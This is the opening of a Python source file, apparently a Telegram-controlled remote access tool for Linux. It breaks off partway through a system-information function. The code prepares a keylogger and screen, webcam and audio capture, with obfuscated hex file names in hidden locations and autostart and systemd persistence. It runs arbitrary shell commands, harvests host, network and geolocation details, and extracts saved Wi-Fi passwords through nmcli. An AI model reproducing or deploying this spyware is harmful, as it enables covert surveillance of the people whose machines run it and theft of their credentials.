# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 11.01.2026
# APP: BOT
# TYPE: TELEGRAM_BOT
# VERSION: LATEST
# PLATFORM: linux
from sys import platform as sys_platform, executable as py_path
if sys_platform != 'linux': raise SystemError(f'DO NOT SUPPORT ({sys_platform})')
import os
#
#-
#--
#---
#----
#-----
#------
#-------------------------|NECESSARILY|-------------------------#
TOKEN = 'TELEGRAM BOT TOKEN'
PASSWORD = 'PASSWORD FOR SESSION WITH TELEGRAM BOT'
SEED = 0 # RESPONSIBLE FOR ENCRYPTION INITIAL VALUES 
PATH = os.path.join('PATH TO SAVE TELEGRAM BOT')
#-----------------------------|END|-----------------------------#



#-------------------------|OPTIONAL|-------------------------#
BOT_FILE_NAME = os.path.split(__file__)[-1] # HOW TO SAVE TELEGRAM BOT NAME IN PATH 
BOT_SERVICE_NAME = 'SERVICE NAME IN SYSTEMCTL FOR TELEGRAM BOT' # NECESSARY IF BOT_EXE IS TRUE
BOT_SERVICE_DESCRIPTION = 'SERVICE DESCRIPTION IN SYSTEMCTL FOR TELEGRAM BOT' # NECESSARY IF BOT_EXE IS TRUE
BOT_EXE = False # TELEGRAM BOT WILL BE LAUNCHED IN (EXE IF BOT_EXE == True ELSE PYTHON) MODE
#----------------------------|END|---------------------------#
#------
#-----
#----
#---
#--
#-
#




import shutil
import platform
from socket import gethostbyname as verify_domain, AF_INET, AF_INET6
from subprocess import run as sp_run, Popen, PIPE, DEVNULL
from webbrowser import open as open_site
from datetime import datetime, timedelta
from random import seed, choice, randint
from re import compile as re_exp, DOTALL
from shlex import split as split_args
from importlib.util import find_spec
from multiprocessing import Process
from time import sleep, time, ctime
from pwd import getpwuid, getpwnam
from io import BytesIO, StringIO
from json import loads as json
from threading import Thread
from locale import getlocale
from getpass import getuser
from stat import filemode


def invalid_type(name, value, valid):
    if not isinstance(value, valid):
        raise TypeError(f'({name}) must be ({valid.__name__})')


invalid_type('BOT_FILE_NAME', BOT_FILE_NAME, str)

if not BOT_FILE_NAME:
    raise ValueError('(BOT_FILE_NAME) is empty')

NULL = 'N/A'

LIBS = (
    'telebot',
    'psutil',
    'mouse',
    'keyboard',
    'pyperclip',
    'mss',
    'ffmpeg-python',
    'requests',
    'chardet',
    'tabulate'
)

BOT_FILE_PATH = os.path.join(PATH, BOT_FILE_NAME)
BOT_FILE_PATH_RECOVERY = '/tmp/.0x5b2fd1329aa49643'

PATH_MEM = os.path.join(PATH, 'mem')
PATH_SYS = os.path.join(PATH, 'sys')
PATH_CONFIG = os.path.join(PATH_SYS, 'config')
PATH_TMP = os.path.join(PATH, 'tmp')
PATH_SHARE = os.path.join(PATH, 'share')
PATH_VENV = os.path.join(PATH, '.venv')

CONFIG_TOKEN = os.path.join(PATH_CONFIG, '0x66f4777938a79111')
CONFIG_PASSWORD = os.path.join(PATH_CONFIG, '0x7dc0a72554c7035d')
CONFIG_SEED = os.path.join(PATH_CONFIG, '0x6e17263f779dce5a')

PID = os.getpid() 
MACHINE = platform.machine()
ARCHITECTURE = platform.architecture()[0]
PROCESSOR = platform.processor()
OS = {
    'platform': platform.system(), 
    'release': platform.release(), 
    'version': platform.version()
}
NODE = platform.node()
USER = getuser()
LANG, ENCODING = getlocale()

PATH_DMI = '/sys/class/dmi/id'
PATH_ENVIRONMENT = '/etc/environment'
PATH_SYSTEMCTL = '/etc/systemd/system'
PATH_BASH = '/bin/bash'
PATH_PKEXEC = '/usr/bin/pkexec'
PATH_CRONTAB = '/etc/crontab'

FILE_ENCODING = 'UTF-8'
FILE_PYTHON = os.path.join(PATH_VENV, 'bin', 'python')
FILE_PIP = os.path.join(PATH_VENV, 'bin', 'pip')
FILE_INIT = os.path.join(PATH_SYS, '.init.sh')
FILE_FLIB = os.path.join(PATH_SYS, '0x5eaf4968a2b5e79e')
FILE_AUTOSTART = os.path.join(PATH_SYS, '0x79f2d2686b6da01e')
FILE_APP_BLOCKER = os.path.join(PATH_TMP, '0x1f95051e7493c896')
FILE_KEYLOGGER_FLAG = os.path.join(PATH_SYS, '0x2a47be6d04a14df5')
FILE_KEYLOGGER = os.path.join(PATH_TMP, '0x4b0944084a778666')
FILE_SCREENSHOT = os.path.join(PATH_TMP, '0x1749063d3b828a7b')
FILE_WEBCAM_SCREENSHOT = os.path.join(PATH_TMP, '0x59cb2f485e387a63')
FILE_AUDIO = os.path.join(PATH_TMP, '0x78df1954620311d6')
FILE_HOSTS = '/etc/hosts'

KEYBOARD_HOTKEY = {'backspace': '[BACKSPACE]', 'enter': '[ENTER]', 'space': '[SPACE]', 'ctrl': '[CTRL]', 'left ctrl': '[LEFT CTRL]', 'right ctrl': '[RIGHT CTRL]', 'shift': '[SHIFT]', 'left shift': '[LEFT SHIFT]', 'right shift': '[RIGHT SHIFT]', 'alt': '[ALT]', 'left alt': '[LEFT ALT]', 'right alt': '[RIGHT ALT]', 'tab': '[TAB]', 'caps lock': '[CAPS LOCK]', 'up': '[UP]', 'down': '[DOWN]', 'left': '[LEFT]', 'right': '[RIGHT]', 'insert': '[INSERT]', 'home': '[HOME]', 'page up': '[PAGE UP]', 'page down': '[PAGE DOWN]', 'delete': '[DELETE]', 'decimal': '[DECIMAL]', 'end': '[END]', 'print screen': '[PRINT SCREEN]', 'scroll lock': '[SCROLL LOCK]', 'pause': '[PAUSE]', 'num lock': '[NUM LOCK]', 'clear': '[CLEAR]', 'esc': '[ESC]', 'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]', 'f4': '[F4]', 'f5': '[F5]', 'f6': '[F6]', 'f7': '[F7]', 'f8': '[F8]', 'f9': '[F9]', 'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]', 'windows': '[WINDOWS]', 'left windows': '[LEFT WINDOWS]', 'right windows': '[RIGHT WINDOWS]', 'num 0': '[NUM 0]', 'num 1': '[NUM 1]', 'num 2': '[NUM 2]', 'num 3': '[NUM 3]', 'num 4': '[NUM 4]', 'num 5': '[NUM 5]', 'num 6': '[NUM 6]', 'num 7': '[NUM 7]', 'num 8': '[NUM 8]', 'num 9': '[NUM 9]', 'num enter': '[NUM ENTER]', 'num +': '[NUM +]', 'num -': '[NUM -]', 'num *': '[NUM *]', 'num /': '[NUM /]', 'media play/pause': '[MEDIA PLAY/PAUSE]', 'media stop': '[MEDIA STOP]', 'media next': '[MEDIA NEXT]', 'media prev': '[MEDIA PREV]', 'volume up': '[VOLUME UP]', 'volume down': '[VOLUME DOWN]', 'mute': '[MUTE]'}
KEYBOARD_SPECIAL = {'[ENTER]': '\n', '[SPACE]': ' ', '[TAB]': '\t'}
KEYLOGGER_BUFFER_SIZE = 30

HTTP_HEADER = choice([{'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:50.0.1) Gecko/20100101 Firefox/50.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.7.4) Gecko/20100101 Firefox/52.7.4'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:58.0.2) Gecko/20100101 Firefox/58.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36 OPR/55.0.2994.61'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0.2) Gecko/20100101 Firefox/56.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; rv:57.0.3) Gecko/20100101 Firefox/57.0.3'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2; rv:52.8.1) Gecko/20100101 Firefox/52.8.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6; rv:60.2.2) Gecko/20100101 Firefox/60.2.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36 OPR/54.0.2952.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36 OPR/52.0.2871.99'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Safari/537.36 OPR/50.0.2762.67'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/55.0.2994.37'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626 Safari/537.36 OPR/56.0.3051.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36 OPR/55.0.2994.47'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0.3) Gecko/20100101 Firefox/66.0.3'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1; rv:52.5.2) Gecko/20100101 Firefox/52.5.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.1.1) Gecko/20100101 Firefox/52.1.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:58.0.2) Gecko/20100101 Firefox/58.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:57.0.2) Gecko/20100101 Firefox/57.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2; rv:52.1.0) Gecko/20100101 Firefox/52.1.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1; rv:66.0.5) Gecko/20100101 Firefox/66.0.5'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6; rv:62.0.2) Gecko/20100101 Firefox/62.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.3.0) Gecko/20100101 Firefox/60.3.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/52.0.2871.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809 Safari/537.36 OPR/58.0.3135.107'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36 OPR/54.0.2952.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0.1) Gecko/20100101 Firefox/51.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1; rv:52.8.1) Gecko/20100101 Firefox/52.8.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:50.0.2) Gecko/20100101 Firefox/50.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0 Safari/537.36 OPR/58.0.3135.127'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:65.0.1) Gecko/20100101 Firefox/65.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/52.0.2871.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.5.2) Gecko/20100101 Firefox/60.5.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/56.0.3051.52'}])

IPCONFIG_URL = 'https://ipinfo.io/json'
IPCONFIG_KEY = {
    'ip': 'ip',
    'isp': 'org',
    'country': 'country',
    'region': 'region',
    'city': 'city',
    'postal': 'postal',
    'timezone': 'timezone',
    'location': 'loc'
}


def parse_cmd(exp, cmd):
    got_args = re_exp('^' + exp, flags=DOTALL).search(cmd)

    if got_args:
        return {key: None if value is None else value.strip()  
                for (key, value) in got_args.groupdict().items()}

    return dict()


def http(url, json=False):
    try:
        query = http_get(url, headers=HTTP_HEADER, timeout=30)
    except:
        return dict() if json else None
    
    if not query.ok:
        return dict() if json else None
    
    return query.json() if json else query.content


def get_date():
    try: 
        return datetime.now().strftime('%H:%M %d.%m.%Y').split() 
    except: 
        return [NULL, NULL]
    

def decode_bytes(data):
    try:
        return data.decode(detect(data[:512])['encoding'])
    except:
        try:
            return data.decode(ENCODING)
        except: 
            return None


def encrypt(data):
    return ''.join([chr((ord(n) << KEY[0]) ^ KEY[1]) for n in data])


def decrypt(data):
    return ''.join([chr((ord(n) ^ KEY[1]) >> KEY[0]) for n in data])


def mem_id(user_id):
    return str((user_id << KEY[0]) ^ KEY[1])


def write_file(path, data):
    if isinstance(data, str):
        with open(path, 'w', encoding=FILE_ENCODING) as f:
            f.write(data)
    else:
        with open(path, 'wb') as f:
            f.write(data)


def read_file(path, b=False):
    if not b:
        with open(path, 'r', encoding=FILE_ENCODING) as f:
            return f.read()
    else:
        with open(path, 'rb') as f:
            return f.read()


def change_file(path, pattern, value, delete=False, enc=False):
    changed = False

    if not os.path.isfile(path):
        return changed

    if not value.endswith('\n'):
        value += '\n'

    with open(path, 'r', encoding=FILE_ENCODING) as f:
        if enc:
            f_data = f.read()

            try:
                f_data = decrypt(f_data).splitlines() if f_data else ['']
            except:
                f_data = ['']
        else:
            f_data = f.readlines()

    with open(path, 'w', encoding=FILE_ENCODING) as f:
        if not delete:
            for n in f_data:
                n = n.rstrip()

                if pattern in n:
                    f.write(encrypt(value) if enc else value)
                    changed = True
                else:
                    f.write(encrypt(n + '\n') if enc else n + '\n')
                    
            if not changed and (value not in f_data):
                f.write(encrypt(value) if enc else value)
                changed = True
        else:
            for n in f_data:
                n = n.rstrip()

                if pattern in n:
                    changed = True
                else:
                    f.write(encrypt(n + '\n') if enc else n + '\n')
                    
    return changed
        

if os.path.isfile(CONFIG_SEED):
    try:
        new_seed = read_file(CONFIG_SEED)

        if new_seed.isdigit():
            SEED = int(new_seed)
    except: 
        os.remove(CONFIG_SEED)

        
seed(SEED)
KEY = (randint(1, 7), randint(1, 255))


if os.path.isfile(CONFIG_TOKEN):
    try:
        TOKEN = decrypt(read_file(CONFIG_TOKEN))
    except: 
        os.remove(CONFIG_TOKEN)

if os.path.isfile(CONFIG_PASSWORD):
    try:
        PASSWORD = decrypt(read_file(CONFIG_PASSWORD))
    except: 
        os.remove(CONFIG_PASSWORD)


def mkdir(path):
    if isinstance(path, str):
        if not os.path.isdir(path):
            os.mkdir(path)
    else:
        for n in path:
            if not os.path.isdir(n):
                os.mkdir(n)


def shell(command, output=False, input=False, timeout=None):
    try:
        executed = sp_run(
            command, 
            input=input, 
            stdout=PIPE if output else DEVNULL, 
            stderr=DEVNULL, 
            shell=True,
            timeout=timeout
        )
    except:
        return None if output else False

    if output:
        data = decode_bytes(executed.stdout)

        return None if data is None else data

    return executed.returncode == 0


def autostart():
    if not os.path.isfile(FILE_AUTOSTART):
        return
    
    try:
        autostart_data = decrypt(read_file(FILE_AUTOSTART)).splitlines()
    except:
        return
    
    for line in autostart_data:
        try:
            _, path, args, _ = line.split('\u200B')

            launch(path, '' if args == 'none' else args)
        except:
            continue


def ls():
    directory = []

    for n in os.listdir('.'):
        try:
            stat = os.lstat(n)
            
            directory.append([
                n, 
                filemode(stat.st_mode),
                'DIR' if os.path.isdir(n) else 'FILE', 
                'TRUE' if n[0] == '.' else 'FALSE', 
                getpwuid(stat.st_uid).pw_name,
                f'{stat.st_size} bytes', 
                ctime(stat.st_mtime)  
            ])
        except:
            continue

    return directory


def hide(path):
    path = os.path.abspath(path)

    dir, base = os.path.split(path)

    if base.startswith('.'):
        return True

    hidden = os.path.join(dir, f'.{base}')

    if os.path.exists(hidden):
        return False

    try:
        os.rename(path, hidden)
        return True
    except:
        return False
    

def unhide(path):
    path = os.path.abspath(path)

    dir, base = os.path.split(path)

    if not base.startswith('.'):
        return True

    visible = os.path.join(dir, base[1:])

    try:
        os.rename(path, visible)
        return True
    except:
        return False
    

def ipconfig():
    try:
        global_inet = http(IPCONFIG_URL, json=True)
    except:
        global_inet = None
    else:
        global_inet_data = {
            'ip': global_inet.get(IPCONFIG_KEY['ip'], NULL),
            'isp': global_inet.get(IPCONFIG_KEY['isp'], NULL),
            'country': global_inet.get(IPCONFIG_KEY['country'], NULL),
            'region': global_inet.get(IPCONFIG_KEY['region'], NULL),
            'city': global_inet.get(IPCONFIG_KEY['city'], NULL),
            'postal': global_inet.get(IPCONFIG_KEY['postal'], NULL),
            'timezone': global_inet.get(IPCONFIG_KEY['timezone'], NULL),
            'location': global_inet.get(IPCONFIG_KEY['location'], NULL)  
        }

    try:
        local_inet = []

        for (name, address) in psutil.net_if_addrs().items():
            adapter = {
                'name': name, 
                'mac': NULL,
                'ipv4': NULL, 
                'ipv6': NULL
            }

            for n in address:
                if n.family == AF_INET:
                    adapter['ipv4'] = NULL if n.address is None else n.address
                elif n.family == AF_INET6:
                    adapter['ipv6'] = NULL if n.address is None else n.address
                else:
                    adapter['mac'] = NULL if n.address is None else n.address.replace('-', ':').upper()
            
            local_inet.append(adapter)
    except:
        local_inet = None

    return {
        'global': global_inet_data,
        'local': local_inet
    }


def route():
    route_result = {
        'ipv4': [],
        'ipv6': []
    }

    route_4 = shell('ip -j -4 route', output=True)
    route_6 = shell('ip -j -6 route', output=True)

    if route_4 is not None:
        for n in json(route_4):
            route_result['ipv4'].append([
                n.get('dev', NULL),
                n.get('dst', NULL),
                n.get('gateway', NULL),
                n.get('prefsrc', NULL),
                n.get('protocol', NULL).upper(),
                n.get('scope', NULL).upper(),
                n.get('metric', NULL)
            ])
    else:
        route_result['ipv4'] = None

    if route_6 is not None:
        for n in json(route_6):
            route_result['ipv6'].append([
                n.get('dev', NULL),
                n.get('dst', NULL),
                n.get('pref', NULL).upper(),
                n.get('protocol', NULL).upper(),
                n.get('metric', NULL)
            ])       
    else:
        route_result['ipv6'] = None

    return route_result


def arp():
    arp_result = []

    ip_neigh = shell('ip -j neigh', output=True)
    
    if ip_neigh is None:
        return arp_result
    
    for n in json(ip_neigh):
        arp_result.append([
           n.get('dst', NULL),
           n.get('lladdr', NULL).upper(),
           n.get('dev', NULL),
           n.get('state', [NULL])[0]
        ])

    return arp_result


def netstat():
    netstat_result = []

    netstat_tunp = shell('netstat -tunp', output=True)

    if netstat_tunp is None:
        return netstat_result
    
    for line in netstat_tunp.splitlines():
        n = line.split()

        if (len(n) != 7) and (n[0] not in {'tcp', 'udp'}):
            continue

        netstat_result.append([
            n[6],
            n[0].upper(),
            n[3],
            n[4],
            n[5]
        ])

    return netstat_result


def wifi():
    wifi_result = []

    nmcli_wifi = shell('nmcli -t -e no -f SSID,CHAN,RATE,MODE,SECURITY,SIGNAL,BSSID dev wifi list', output=True)

    if nmcli_wifi is None:
        return wifi_result
    
    for line in nmcli_wifi.splitlines():
        n = line.split(':', 6) 

        if len(n) != 7:
            continue

        ssid = n[0]

        wifi_result.append([
            ssid if ssid else '<hidden>',
            n[6],
            n[1], 
            n[2],
            n[3],
            n[4],
            n[5]
        ])

    return wifi_result


def wifi_password():
    wifi_password_result = []

    nmcli_profile = shell('nmcli -t -f NAME,TYPE connection show', output=True)

    if nmcli_profile is None:
        return wifi_password_result
    
    for n in nmcli_profile.splitlines():
        try:
            ssid, wtype = n.split(':', 1)
        except:
            continue

        if wtype != '802-11-wireless':
            continue

        profile = ssid.replace('\\:', ':')

        psk = shell(f'nmcli -s -g 802-11-wireless-security.psk connection show "{profile}"', output=True)
        psk = (psk or '').strip()

        if not psk or (psk == '--'):
            continue

        wifi_password_result.append([profile, psk])
    
    return wifi_password_result


def get_user(user=None):
    users = []

    for n in os.listdir('/home'):
        if (user is not None) and (n != user):
            continue 

        if not os.path.isdir(os.path.join('/home', n)):
            continue

        try:
            puser = getpwnam(n)

            if puser.pw_uid < 1000:
                continue
        except:
            continue

        users.append([
            puser.pw_name,
            puser.pw_uid,
            puser.pw_gid,
            puser.pw_dir,
            puser.pw_shell
        ])

    return users


def systeminfo():
    with StringIO() as buf:
        uptime_p = shell('uptime -p', output=True)
        uptime = NULL if uptime_p is None else uptime_p.removeprefix('up').strip()

        try:
            hostnamectl = json(shell('hostnamectl --json short', output=True))
        except:
            hostnamectl = dict()
    
        buf.write(f'''SYSTEM:
\tUPTIME: {uptime}
\tDEVICE: {hostnamectl.get("Chassis", NULL).upper()}
\tMACHINE: {MACHINE}
\tARCHITECTURE: {ARCHITECTURE}
\tBOOT: {"UEFI" if os.path.exists("/sys/firmware/efi") else "BIOS"}
\tHARDWARE VENDOR: {hostnamectl.get("HardwareVendor", NULL)}
\tHARDWARE MODEL: {hostnamectl.get("HardwareModel", NULL)}
\tFIRMWARE VENDOR: {hostnamectl.get("FirmwareVendor", NULL)}
\tFIRMWARE VERSION: {hostnamectl.get("FirmwareVersion", NULL)}
\tOS: {OS["platform"]} {OS["release"]} {OS["version"]}
\tNODE: {NODE}
\tUSER: {USER}
\tLOGGED USER: {LOGGED_USER}
\tLANG: {LANG}
\tENCODING: {ENCODING}
''')
        
        ruser = get_user()
        buf.write('\nUSER:\n')

        if ruser:
            for n in ruser:
                buf.write(f'\tNAME: {n[0]}\n\tUID: {n[1]}\n\tGID: {n[2]}\n\tDIR: {n[3]}\n\tSHELL: {n[4]}\n\n')

        buf.write(('' if ruser else '\n') + 'IPCONFIG:\n')
        ipconfig_dict = ipconfig()
        
        ipconfig_global, ipconfig_local = ipconfig_dict['global'], ipconfig_dict['local']

        if ipconfig_global is not None:
            buf.write(f'''\tGLOBAL:
\t\tIP: {ipconfig_global["ip"]}
\t\tISP: {ipconfig_global["isp"]}
\t\tCOUNTRY: {ipconfig_global["country"]}
\t\tREGION: {ipconfig_global["region"]}
\t\tCITY: {ipconfig_global["city"]}
\t\tPOSTAL: {ipconfig_global["postal"]}
\t\tTIMEZONE: {ipconfig_global["timezone"]}
\t\tLOCATION: {ipconfig_global["location"]}''')
            
        if ipconfig_local is not None:
            buf.write('\n\n\tLOCAL:\n')

            for n in ipconfig_local:
                buf.write(f'\t\tADAPTER: {n["name"]}\n\t\tMAC: {n["mac"]}\n\t\tIPV4: {n["ipv4"]}\n\t\tIPV6: {n["ipv6"]}\n\n')
        
        try:
            bios_vendor = read_file(os.path.join(PATH_DMI, 'bios_vendor')).rstrip()
        except:
            bios_vendor = NULL
        try:
            bios_version = read_file(os.path.join(PATH_DMI, 'bios_version')).rstrip()
        except:
            bios_version = NULL
        try:
            bios_date = read_file(os.path.join(PATH_DMI, 'bios_date')).rstrip()
        except:
            bios_date = NULL

        buf.write(('\n' if ipconfig_local is None else '') + f'BIOS:\n\tVENDOR: {bios_vendor}\n\tVERSION: {bios_version}\n\tDATE: {bios_date}\n')

        try:
            baseboard_product = read_file(os.path.join(PATH_DMI, 'board_name')).rstrip()
        except:
            baseboard_product = NULL
        try:
            baseboard_vendor = read_file(os.path.join(PATH_DMI, 'board_vendor')).rstrip()
        except:
            baseboard_vendor = NULL
        try:
            baseboard_version = read_file(os.path.join(PATH_DMI, 'board_version')).rstrip()
        except:
            baseboard_version = NULL        
        
        buf.write(f'\nBASEBOARD:\n\tPRODUCT: {baseboard_product}\n\tVENDOR: {baseboard_vendor}\n\tVERSION: {baseboard_version}\n')
        
        buf.write('\nBATTERY:\n')
        battery = psutil.sensors_battery()

        if battery:
            buf.write(f'''\tPERCENT: {NULL if battery.percent is None else battery.percent}%
\tPLUGGED IN: {NULL if battery.power_plugged is None else battery.power_plugged}
\tTIME LEFT: {battery.secsleft // 60 if (battery.secsleft is None) or (battery.secsleft > 0) else NULL} minutes
''')

        pcpu_freq = psutil.cpu_freq()
        pcpu_percent = psutil.cpu_percent()

        cpu_freq = int(pcpu_freq.current) if pcpu_freq and (pcpu_freq.current is not None) else NULL
        cpu_usage = int(pcpu_percent) if pcpu_percent else (0 if pcpu_percent == 0 else NULL)

        buf.write(f'''\nCPU:
\tNAME: {PROCESSOR}
\tCORE: {os.cpu_count()}
\tFREQUENCY: {cpu_freq} MHz
